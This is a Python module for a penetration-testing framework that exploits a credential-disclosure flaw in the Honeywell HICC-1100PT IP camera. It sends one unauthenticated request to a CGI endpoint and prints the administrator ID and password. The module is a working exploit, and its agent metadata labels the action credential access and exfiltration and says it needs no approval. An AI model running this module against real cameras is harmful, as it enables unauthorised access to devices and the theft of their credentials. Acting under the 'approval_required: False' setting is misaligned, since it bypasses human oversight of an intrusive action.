#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Honeywell IP-Camera HICC-1100PT Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Honeywell IP-Camera HICC-1100PT Password Disclosure',
        'description': 'Module exploits Honeywell IP-Camera HICC-1100PT Password Dislosure vulnerability. If target is vulnerable it is possible to read administrative credentials.',
        'author': ['Yakir Wizman', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/40261/'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/readfile.cgi?query=ADMINID",
        )

        if response and "Adm_ID" in response.text:
            self.content = response.text
            return True  # target is vulnerable

        return False  # target is not vulnerable
